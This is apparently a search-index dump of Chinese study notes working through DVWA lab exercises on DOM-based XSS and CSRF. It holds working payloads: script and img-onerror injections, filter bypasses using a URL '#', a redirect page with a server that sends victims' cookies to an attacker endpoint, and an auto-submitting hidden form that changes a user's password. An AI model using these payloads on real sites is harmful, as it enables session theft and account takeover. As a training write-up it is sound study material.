console.log(req.query.cookie); console.log(\"-----------------\"); res.redirect('http://www.baidu.com'); }); \u6700\u540e cookie \u663e\u793a\u5728\u4e86\u670d\u52a1\u7aef\u7684\u65e5\u5fd7\u4e2d\u3002 \\text{Figure 3. Show Cookie} 3.2. Medium # \u63a5\u4e0b\u91cc\u662f Medium \u96be\u5ea6\u3002 \u6211\u4eec\u5148\u67e5\u770b\u4e00\u4e0b\u6e90\u7801\uff0c\u8fd9\u91cc\u5bf9 default \u5c5e\u6027\u7684\u503c\u505a\u4e86\u4e00\u4e2a\u5224\u65ad\uff0c\u5982\u679c\u5305\u542b <script \u5219\u5c06\u5176\u503c\u6062\u590d\u5230 English \uff0c\u4f1a\u5c06 URL \u4e2d\u7684 JavaScript \u811a\u672c\u7b5b\u9664\u6389\u3002 <?php // Is there any input? if ( array_key_exists( \"default\", $_GET ) && !is_null ($_GET[ 'default' ]) ) { $default = $_GET['default']; # Do not allow script tags if (stripos ($default, \"<script\") !== false) { header (\"location: ?default=English\"); exit; } } ?> script \u6807\u7b7e\u4e0d\u80fd\u7528\u4e86\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528 img \u6807\u7b7e\u8bbf\u95ee\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u8d44\u6e90\uff0c\u7136\u540e\u5728 onerror \u4e2d\u8c03\u7528 JavaScript \u4ee3\u7801\u3002 \u5982\u679c\u7528 document.write \u5728 select \u6807\u7b7e\u4e2d\u5199\u5165 img \u6807\u7b7e\uff0c\u4f1a\u88ab\u81ea\u52a8\u62b9\u9664\u6389\uff0c\u6240\u4ee5\u8981\u95ed\u5408 option \u548c select \u6807\u7b7e \u628a transfer.js \u6539\u6210\u4e0b\u9762\u8fd9\u6837\uff0c\u5c31\u80fd\u5728 onerror \u4e2d\u4f7f\u7528 alert \u547d\u4ee4\u4e86\u3002 window.location.href = \"http://9710fc76520cf9b2ff5ea67e0af9e0df.n2.vsgo.cloud:10278/web/vulnerabilities/xss_d/?default=English</option></select><img hidden src=x onerror=alert(document.cookie)>\"; \\text{Figure 4. Medium} \u4e0d\u8fc7\u8fd9\u91cc\u56e0\u4e3a\u4e0d\u80fd\u628a\u5b57\u7b26\u4e32\u548c\u53d8\u91cf\u533a\u5206\u5f00\uff0c\u6240\u4ee5\u4e0d\u80fd\u4f7f\u7528\u66f4\u52a0\u590d\u6742\u7684 JavaScript \u4ee3\u7801\u3002 \u8981\u5b9e\u73b0\u628acookie\u53d1\u9001\u5230\u670d\u52a1\u7aef\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u5728URL\u4e2d\u4f7f\u7528 # \u7b26\u53f7\uff0c # \u5728URL\u4e2d\u7528\u6765\u5728\u9875\u9762\u4e2d\u8fdb\u884c\u5b9a\u4f4d\uff0c\u6d4f\u89c8\u5668\u4e0d\u4f1a\u628a # \u540e\u9762\u7684\u503c\u53d1\u9001\u5230\u670d\u52a1\u7aef\u3002 \u6240\u4ee5\uff0c\u6211\u4eec\u5728 transfer.js \u4e2d\u52a0\u5165\u4e00\u4e2a # \u7b26\u53f7\u3002 window.location.href = \"http://9710fc76520cf9b2ff5ea67e0af9e0df.n1.vsgo.cloud:10278/web/vulnerabilities/xss_d/?default=English# <script src=http://localhost:8888/hack.js>\\</script>\"; \u8fd9\u6837\u5c31\u80fd\u7ed5\u8fc7\u68c0\u67e5\u89c4\u5219\uff0c\u8fbe\u5230\u5411\u6211\u4eec\u7684\u670d\u52a1\u5668\u53d1\u9001 cookie \u7684\u76ee\u7684\u4e86\u3002 \\text{Figure 5. Show Cookie} 3.3. High # \u63a5\u4e0b\u6765\u662f High \u96be\u5ea6\uff0c\u6e90\u7801\u5982\u4e0b\u3002 <?php // Is there any input? if ( array_key_exists( \"default\", $_GET ) && !is_null ($_GET[ 'default' ]) ) { # White list the allowable languages switch ($_GET['default']) { case \"French\": case \"English\": case \"German\": case \"Spanish\": # ok break; default: header (\"location: ?default=English\"); exit; } } ?> \u8fd9\u91cc\u4f7f\u7528\u4e86\u767d\u540d\u5355\uff0c\u53ea\u5141\u8bb8 default \u5c5e\u6027\u4e3a4\u4e2a\u5408\u6cd5\u503c\u3002\u7528\u4e0a\u9762\u63d0\u5230\u7684 # \u7b26\u53f7\u540c\u6837\u53ef\u4ee5\u7ed5\u8fc7\u3002 window.location.href = \"http://9710fc76520cf9b2ff5ea67e0af9e0df.n1.vsgo.cloud:10278/web/vulnerabilities/xss_d/?default=English# <script src=http://localhost:8888/hack.js>\\</script>\"; 3.3. Impossible # Impossible \u5c31\u57fa\u672c\u4e0a\u6ca1\u6709\u4ec0\u4e48\u5b89\u5168\u6f0f\u6d1e\u4e86\u3002 <?php # Don't need to do anything, protction handled on the client side ?> if (document.location.href.indexOf(\"default=\") >= 0) { var lang = document.location.href.substring(document.location.href.indexOf(\"default=\") + 8); document.write(\"<option value='\" + lang + \"'>\" + (lang) + \"</option>\"); document.write(\"<option value='' disabled='disabled'>----</option>\"); } document.write(\"<option value='English'>English</option>\"); document.write(\"<option value='French'>French</option>\"); document.write(\"<option value='Spanish'>Spanish</option>\"); document.write(\"<option value='German'>German</option>\"); JavaScript \u4e2d\u6ca1\u6709\u5bf9 URL \u8fdb\u884c\u89e3\u7801\uff0c English \u540e\u9762\u7684\u811a\u672c\u4f1a\u88ab URL \u7f16\u7801\u540e\u653e\u5728\u9009\u9879\u4e2d\uff0c\u811a\u672c\u4e0d\u4f1a\u6267\u884c\u3002 \\text{Figure 6. Impossible} \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3.DVWA XSS DOM All"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/3.DVWA_XSS_DOM_All/#dvwa-xss-dom-all","text":"","title":"DVWA XSS DOM All"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/3.DVWA_XSS_DOM_All/#_1","text":"DVWA XSS DOM All \u76ee\u5f55 1. \u80cc\u666f 2. \u73af\u5883\u642d\u5efa 3. \u8de8\u7ad9\u811a\u672c\u653b\u51fb 3.1. Low 3.2. Medium 3.3. High 3.3. Impossible","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/3.DVWA_XSS_DOM_All/#1","text":"\u6700\u8fd1\u9700\u8981\u8865\u5145\u4e00\u4e0b\u7f51\u7edc\u5b89\u5168\u65b9\u9762\u7684\u77e5\u8bc6\uff0c\u4e8e\u662f\u5c31\u4ece\u57fa\u7840\u7684\u9776\u573a DVWA (Damn Vulnerable Web Application) \u5f00\u59cb\u5237\u8d77\uff0c\u8fd9\u4e00\u7bc7\u662f\u5173\u4e8e\u4ece Low \u5230 High \u96be\u5ea6\u7684\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u7684\u5185\u5bb9\u3002 \u548c\u6211\u4e00\u6837\u5e0c\u671b\u5b66\u4e60\u7f51\u7edc\u5b89\u5168\u77e5\u8bc6\u7684\u540c\u5b66\uff0c\u63a8\u8350\u5b66\u4e60 \u300aWeb\u5b89\u5168\u653b\u9632\u5b9e\u6218\u300b \u548c \u300a\u5b89\u5168\u653b\u9632\u6280\u80fd30\u8bb2\u300b \u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/3.DVWA_XSS_DOM_All/#2","text":"\u53c2\u8003\u4e0a\u4e00\u7bc7 \u5173\u4e8e Brute Force \u66b4\u529b\u7834\u89e3\u5bc6\u7801\u7684\u535a\u5ba2 \u3002","title":"2. \u73af\u5883\u642d\u5efa"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/3.DVWA_XSS_DOM_All/#3","text":"","title":"3. \u8de8\u7ad9\u811a\u672c\u653b\u51fb"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/3.DVWA_XSS_DOM_All/#31-low","text":"\\text{Figure 1. XSS DOM} \u5148\u4ece Low \u96be\u5ea6\u5f00\u59cb\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e0b\u62c9\u9009\u62e9\u6846\uff0c\u6211\u4eec\u5148\u770b\u4e00\u770b\u6784\u6210\u9009\u9879\u7684 Javascript \u4ee3\u7801\uff0c\u8fd9\u91cc\u4f1a\u5c06URL\u4e2d\u7684 default \u5173\u952e\u5b57\u7684\u503c\u62fc\u63a5\u5230 HTML \u4e2d\u3002 if (document.location.href.indexOf(\"default=\") >= 0) { var lang = document.location.href.substring(document.location.href.indexOf(\"default=\") + 8); document.write(\"<option value='\" + lang + \"'>\" + decodeURI(lang) + \"</option>\"); document.write(\"<option value='' disabled='disabled'>----</option>\"); } document.write(\"<option value='English'>English</option>\"); document.write(\"<option value='French'>French</option>\"); document.write(\"<option value='Spanish'>Spanish</option>\"); document.write(\"<option value='German'>German</option>\"); \u518d\u770b\u4e00\u770b\u670d\u52a1\u7aef\u7684\u4ee3\u7801\uff0c Low \u96be\u5ea6\u6ca1\u6709\u5bf9 URL \u8fdb\u884c\u4efb\u4f55\u63a7\u5236\u3002 <?php # No protections, anything goes ?> \u6bd4\u5982\u6211\u4eec\u60f3\u8981\u7a83\u53d6\u522b\u4eba\u7684 Cookie \u7684\u8bdd\uff0c\u53ea\u9700\u8981\u8bf1\u5bfc\u4ed6\u70b9\u51fb\u4e0b\u9762\u7684\u94fe\u63a5\u3002 http://9710fc76520cf9b2ff5ea67e0af9e0df.n1.vsgo.cloud:10278/web/vulnerabilities/xss_d/?default=English<script>alert(document.cookie)</script> \\text{Figure 2. Cookie} \u5f53\u7136\uff0c\u8fd9\u4e2a\u94fe\u63a5\u592a\u660e\u663e\u4e86\uff0c\u522b\u4eba\u4e0d\u4e00\u5b9a\u4f1a\u70b9\u51fb\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u670d\u52a1\u5668\u4e0a\u6302\u4e00\u4e2a\u7f51\u9875\uff0c\u4ece\u7f51\u9875\u8f6c\u5230\u8fd9\u4e2a\u94fe\u63a5\u5373\u53ef\u3002 \u8fd9\u91cc\u6211\u4eec\u4ec5\u5728\u672c\u5730\u8c03\u8bd5\uff0c\u6211\u4eec\u5728\u672c\u5730 8888 \u7aef\u53e3\u6302\u4e00\u4e2a hack.js \u6587\u4ef6\uff0c\u8fd9\u91cc\u7684\u547d\u4ee4\u5c06\u4f1a\u628a Cookie \u53d1\u9001\u5230 hack \u63a5\u53e3\u3002 window.location.href = \"http://localhost:8888/hack?cookie=\" + document.cookie; \u518d\u6784\u9020\u4e00\u4e2a\u8df3\u8f6c\u9875\u9762\u4f5c\u4e3a index.html \u3002 <!DOCTYPE html> <html lang=\"zh\"> <head> <meta charset=\"UTF-8\"> <style> div { text-align: center; } </style> </head> <body> <div> <p> \u9875\u9762\u8df3\u8f6c\u4e2d\uff0c\u8bf7\u7a0d\u5019\u3002\u3002\u3002 </p> <script src=\"transfer.js\"> </script> </div> </body> </html> \u4e0b\u9762\u662f\u9875\u9762\u4e2d\u6267\u884c\u7684 transfer.js \u6587\u4ef6\uff0c\u5b83\u5c06\u5f53\u524d\u9875\u9762\u8df3\u8f6c\u5230XSS\uff0c\u7136\u540e\u6267\u884c hack.js \uff0c\u628a cookie \u53d1\u9001\u5230\u4e86 hack \u7aef\u53e3\u3002 window.location.href = \"http://9710fc76520cf9b2ff5ea67e0af9e0df.n1.vsgo.cloud:10278/web/vulnerabilities/xss_d/?default=English<script src=http://localhost:8888/hack.js>\\</script>\"; \u670d\u52a1\u7aef\u4ee5 Express \u4e3a\u4f8b\uff0c hack \u7aef\u53e3\u8f93\u51fa\u4e86\u4f20\u5165\u7684 cookie \uff0c\u5e76\u5c06\u9875\u9762\u518d\u91cd\u5b9a\u5411\u5230 www.baidu.com \u3002 Express \u7684\u5177\u4f53\u914d\u7f6e\u53ef\u4ee5\u53c2\u8003 \u53e6\u4e00\u7bc7\u535a\u5ba2 \u3002 var app = express(); app.get('/hack', function (req, res, next) { console.log(\"-----------------\"); console.log(req.query.cookie); console.log(\"-----------------\"); res.redirect('http://www.baidu.com'); }); \u6700\u540e cookie \u663e\u793a\u5728\u4e86\u670d\u52a1\u7aef\u7684\u65e5\u5fd7\u4e2d\u3002 \\text{Figure 3. Show Cookie}","title":"3.1. Low"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/3.DVWA_XSS_DOM_All/#32-medium","text":"\u63a5\u4e0b\u91cc\u662f Medium \u96be\u5ea6\u3002 \u6211\u4eec\u5148\u67e5\u770b\u4e00\u4e0b\u6e90\u7801\uff0c\u8fd9\u91cc\u5bf9 default \u5c5e\u6027\u7684\u503c\u505a\u4e86\u4e00\u4e2a\u5224\u65ad\uff0c\u5982\u679c\u5305\u542b <script \u5219\u5c06\u5176\u503c\u6062\u590d\u5230 English \uff0c\u4f1a\u5c06 URL \u4e2d\u7684 JavaScript \u811a\u672c\u7b5b\u9664\u6389\u3002 <?php // Is there any input? if ( array_key_exists( \"default\", $_GET ) && !is_null ($_GET[ 'default' ]) ) { $default = $_GET['default']; # Do not allow script tags if (stripos ($default, \"<script\") !== false) { header (\"location: ?default=English\"); exit; } } ?> script \u6807\u7b7e\u4e0d\u80fd\u7528\u4e86\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528 img \u6807\u7b7e\u8bbf\u95ee\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u8d44\u6e90\uff0c\u7136\u540e\u5728 onerror \u4e2d\u8c03\u7528 JavaScript \u4ee3\u7801\u3002 \u5982\u679c\u7528 document.write \u5728 select \u6807\u7b7e\u4e2d\u5199\u5165 img \u6807\u7b7e\uff0c\u4f1a\u88ab\u81ea\u52a8\u62b9\u9664\u6389\uff0c\u6240\u4ee5\u8981\u95ed\u5408 option \u548c select \u6807\u7b7e \u628a transfer.js \u6539\u6210\u4e0b\u9762\u8fd9\u6837\uff0c\u5c31\u80fd\u5728 onerror \u4e2d\u4f7f\u7528 alert \u547d\u4ee4\u4e86\u3002 window.location.href = \"http://9710fc76520cf9b2ff5ea67e0af9e0df.n2.vsgo.cloud:10278/web/vulnerabilities/xss_d/?default=English</option></select><img hidden src=x onerror=alert(document.cookie)>\"; \\text{Figure 4. Medium} \u4e0d\u8fc7\u8fd9\u91cc\u56e0\u4e3a\u4e0d\u80fd\u628a\u5b57\u7b26\u4e32\u548c\u53d8\u91cf\u533a\u5206\u5f00\uff0c\u6240\u4ee5\u4e0d\u80fd\u4f7f\u7528\u66f4\u52a0\u590d\u6742\u7684 JavaScript \u4ee3\u7801\u3002 \u8981\u5b9e\u73b0\u628acookie\u53d1\u9001\u5230\u670d\u52a1\u7aef\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u5728URL\u4e2d\u4f7f\u7528 # \u7b26\u53f7\uff0c # \u5728URL\u4e2d\u7528\u6765\u5728\u9875\u9762\u4e2d\u8fdb\u884c\u5b9a\u4f4d\uff0c\u6d4f\u89c8\u5668\u4e0d\u4f1a\u628a # \u540e\u9762\u7684\u503c\u53d1\u9001\u5230\u670d\u52a1\u7aef\u3002 \u6240\u4ee5\uff0c\u6211\u4eec\u5728 transfer.js \u4e2d\u52a0\u5165\u4e00\u4e2a # \u7b26\u53f7\u3002 window.location.href = \"http://9710fc76520cf9b2ff5ea67e0af9e0df.n1.vsgo.cloud:10278/web/vulnerabilities/xss_d/?default=English# <script src=http://localhost:8888/hack.js>\\</script>\"; \u8fd9\u6837\u5c31\u80fd\u7ed5\u8fc7\u68c0\u67e5\u89c4\u5219\uff0c\u8fbe\u5230\u5411\u6211\u4eec\u7684\u670d\u52a1\u5668\u53d1\u9001 cookie \u7684\u76ee\u7684\u4e86\u3002 \\text{Figure 5. Show Cookie}","title":"3.2. Medium"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/3.DVWA_XSS_DOM_All/#33-high","text":"\u63a5\u4e0b\u6765\u662f High \u96be\u5ea6\uff0c\u6e90\u7801\u5982\u4e0b\u3002 <?php // Is there any input? if ( array_key_exists( \"default\", $_GET ) && !is_null ($_GET[ 'default' ]) ) { # White list the allowable languages switch ($_GET['default']) { case \"French\": case \"English\": case \"German\": case \"Spanish\": # ok break; default: header (\"location: ?default=English\"); exit; } } ?> \u8fd9\u91cc\u4f7f\u7528\u4e86\u767d\u540d\u5355\uff0c\u53ea\u5141\u8bb8 default \u5c5e\u6027\u4e3a4\u4e2a\u5408\u6cd5\u503c\u3002\u7528\u4e0a\u9762\u63d0\u5230\u7684 # \u7b26\u53f7\u540c\u6837\u53ef\u4ee5\u7ed5\u8fc7\u3002 window.location.href = \"http://9710fc76520cf9b2ff5ea67e0af9e0df.n1.vsgo.cloud:10278/web/vulnerabilities/xss_d/?default=English# <script src=http://localhost:8888/hack.js>\\</script>\";","title":"3.3. High"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/3.DVWA_XSS_DOM_All/#33-impossible","text":"Impossible \u5c31\u57fa\u672c\u4e0a\u6ca1\u6709\u4ec0\u4e48\u5b89\u5168\u6f0f\u6d1e\u4e86\u3002 <?php # Don't need to do anything, protction handled on the client side ?> if (document.location.href.indexOf(\"default=\") >= 0) { var lang = document.location.href.substring(document.location.href.indexOf(\"default=\") + 8); document.write(\"<option value='\" + lang + \"'>\" + (lang) + \"</option>\"); document.write(\"<option value='' disabled='disabled'>----</option>\"); } document.write(\"<option value='English'>English</option>\"); document.write(\"<option value='French'>French</option>\"); document.write(\"<option value='Spanish'>Spanish</option>\"); document.write(\"<option value='German'>German</option>\"); JavaScript \u4e2d\u6ca1\u6709\u5bf9 URL \u8fdb\u884c\u89e3\u7801\uff0c English \u540e\u9762\u7684\u811a\u672c\u4f1a\u88ab URL \u7f16\u7801\u540e\u653e\u5728\u9009\u9879\u4e2d\uff0c\u811a\u672c\u4e0d\u4f1a\u6267\u884c\u3002 \\text{Figure 6. Impossible} \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3.3. Impossible"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/4.DVWA_CSRF_All/","text":"DVWA XSS DOM All # \u76ee\u5f55 # DVWA XSS DOM All \u76ee\u5f55 1. \u80cc\u666f 2. \u73af\u5883\u642d\u5efa 3. \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020 3.1. Low 3.2. Medium 3.3. High 3.3. Impossible 1. \u80cc\u666f # \u6700\u8fd1\u9700\u8981\u8865\u5145\u4e00\u4e0b\u7f51\u7edc\u5b89\u5168\u65b9\u9762\u7684\u77e5\u8bc6\uff0c\u4e8e\u662f\u5c31\u4ece\u57fa\u7840\u7684\u9776\u573a DVWA (Damn Vulnerable Web Application) \u5f00\u59cb\u5237\u8d77\uff0c\u8fd9\u4e00\u7bc7\u662f\u5173\u4e8e\u4ece Low \u5230 High \u96be\u5ea6\u7684\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u7684\u5185\u5bb9\u3002 \u548c\u6211\u4e00\u6837\u5e0c\u671b\u5b66\u4e60\u7f51\u7edc\u5b89\u5168\u77e5\u8bc6\u7684\u540c\u5b66\uff0c\u63a8\u8350\u5b66\u4e60 \u300aWeb\u5b89\u5168\u653b\u9632\u5b9e\u6218\u300b \u548c \u300a\u5b89\u5168\u653b\u9632\u6280\u80fd30\u8bb2\u300b \u3002 2. \u73af\u5883\u642d\u5efa # \u53c2\u8003\u4e0a\u4e00\u7bc7 \u5173\u4e8e Brute Force \u66b4\u529b\u7834\u89e3\u5bc6\u7801\u7684\u535a\u5ba2 \u3002 3. \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020 # \u6211\u4eec\u9700\u8981\u5728\u7528\u6237\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u6539\u6389\u7528\u6237\u7684\u5bc6\u7801\u3002 3.1. Low # \\text{Figure 1. CSRF} \u5148\u770b\u6e90\u7801\uff0c Low \u96be\u5ea6\u6ca1\u6709\u8bbe\u7f6e\u4efb\u4f55\u8bf7\u6c42\u6765\u6e90\u7684\u6821\u9a8c\u3002 <?php if( isset( $_GET[ 'Change' ] ) ) { // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update the database $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' ); // Feedback for the user echo \"<pre>Password Changed.</pre>\"; } else { // Issue with passwords matching echo \"<pre>Passwords did not match.</pre>\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?> \u53ea\u9700\u8981\u8ba9\u4ed6\u4eba\u70b9\u51fb\u4e0b\u9762\u7684\u94fe\u63a5\uff0c\u5bc6\u7801\u5c31\u4fee\u6539\u6210\u529f\u4e86\u3002 http://9710fc76520cf9b2ff5ea67e0af9e0df.n1.vsgo.cloud:7147/web/vulnerabilities/csrf/?password_new=hackerPassword&password_conf=hackerPassword&Change=Change# \u4e0d\u8fc7\u8fd9\u4e2a\u94fe\u63a5\u592a\u660e\u663e\u4e86\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u9875\u9762\u653e\u5728\u81ea\u5df1\u7684\u670d\u52a1\u5668\u4e0a\u3002 <!-- index.html --> <!DOCTYPE html> <html lang=\"zh\"> <head> <meta charset=\"UTF-8\"> <!-- for HTML5 --> <style> div { text-align: center; } </style> </head> <body> <div> <p> \u9875\u9762\u8df3\u8f6c\u4e2d\uff0c\u8bf7\u7a0d\u5019\u3002\u3002\u3002 </p> <style> form { display: none; } </style> <form action=\"http://9710fc76520cf9b2ff5ea67e0af9e0df.n1.vsgo.cloud:7147/web/vulnerabilities/csrf/\" method=\"GET\"> New password:<br /> <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_new\" value=\"hackerPassword\"><br /> Confirm new password:<br /> <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_conf\" value=\"hackerPassword\"><br /> <br /> <input type=\"submit\" id=\"button\" name=\"Change\" value=\"Change\" /> </form> <script> document.getElementById(\"button\").click(); </script> </div> </body> </html> \u70b9\u51fb\u4ee5\u540e\u5c31\u4f1a\u53d1\u9001\u8bf7\u6c42\u6539\u53d8\u7528\u6237\u7684\u5bc6\u7801\u3002 \\text{Figure 2. Low} 3.2. Medium # \u63a5\u4e0b\u6765\u662f Medium \u96be\u5ea6\uff0c\u5148\u770b\u6e90\u7801\u3002 <?php if( isset( $_GET[ 'Change' ] ) ) { // Checks to see where the request came from if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) { // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update the database $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' ); // Feedback for the user echo \"<pre>Password Changed.</pre>\"; } else { // Issue with passwords matching echo \"<pre>Passwords did not match.</pre>\"; } } else { // Didn't come from a trusted source echo \"<pre>That request didn't look correct.</pre>\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?> \u8fd9\u91cc\u52a0\u5165\u4e86\u4e00\u4e2a\u6765\u6e90\u7684\u6821\u9a8c\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u4e00\u770b\u8fd9\u6bb5\u4ee3\u7801\u7684\u542b\u4e49 // Checks to see where the request came from if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) stripos \u51fd\u6570\uff1a stripos ( string $haystack , string $needle [, int $offset = 0 ] ) : int \u8fd4\u56de\u5728\u5b57\u7b26\u4e32 haystack \u4e2d needle \u9996\u6b21\u51fa\u73b0\u7684\u6570\u5b57\u4f4d\u7f6e\u3002 $_SERVER \u662f\u4e00\u4e2a\u5305\u542b\u4e86\u8bf8\u5982 \u5934\u4fe1\u606f(header) \u3001 \u8def\u5f84(path) \u3001\u4ee5\u53ca \u811a\u672c\u4f4d\u7f6e(script locations) \u7b49\u7b49\u4fe1\u606f\u7684\u6570\u7ec4\u3002\u8fd9\u4e2a\u6570\u7ec4\u4e2d\u7684\u9879\u76ee\u7531 Web \u670d\u52a1\u5668\u521b\u5efa\u3002 HTTP_REFERER \uff1a\u5f15\u5bfc\u7528\u6237\u4ee3\u7406\u5230\u5f53\u524d\u9875\u7684\u524d\u4e00\u9875\u7684\u5730\u5740\uff08\u5982\u679c\u5b58\u5728\uff09\u3002\u7531 user agent \u8bbe\u7f6e\u51b3\u5b9a\u3002\u5e76\u4e0d\u662f\u6240\u6709\u7684\u7528\u6237\u4ee3\u7406\u90fd\u4f1a\u8bbe\u7f6e\u8be5\u9879\uff0c\u6709\u7684\u8fd8\u63d0\u4f9b\u4e86\u4fee\u6539 HTTP_REFERER \u7684\u529f\u80fd\u3002\u7b80\u8a00\u4e4b\uff0c\u8be5\u503c\u5e76\u4e0d\u53ef\u4fe1\u3002 SERVER_NAME \uff1a\u5f53\u524d\u8fd0\u884c\u811a\u672c\u6240\u5728\u7684\u670d\u52a1\u5668\u7684\u4e3b\u673a\u540d\u3002\u5982\u679c\u811a\u672c\u8fd0\u884c\u4e8e\u865a\u62df\u4e3b\u673a\u4e2d\uff0c\u8be5\u540d\u79f0\u662f\u7531\u90a3\u4e2a\u865a\u62df\u4e3b\u673a\u6240\u8bbe\u7f6e\u7684\u503c\u51b3\u5b9a\u3002 HTTP_REFERER \u4e0d\u80fd\u901a\u8fc7 jQuery \u8bf7\u6c42\u4f2a\u9020\u53d1\u9001\u3002 \\text{Figure 3. Set Header} \u4f7f\u7528 Ajax \u53d1\u9001\u8bf7\u6c42\u8fd8\u4f1a\u9047\u5230\u8de8\u57df\u95ee\u9898\u3002 \\text{Figure 4. CORS} 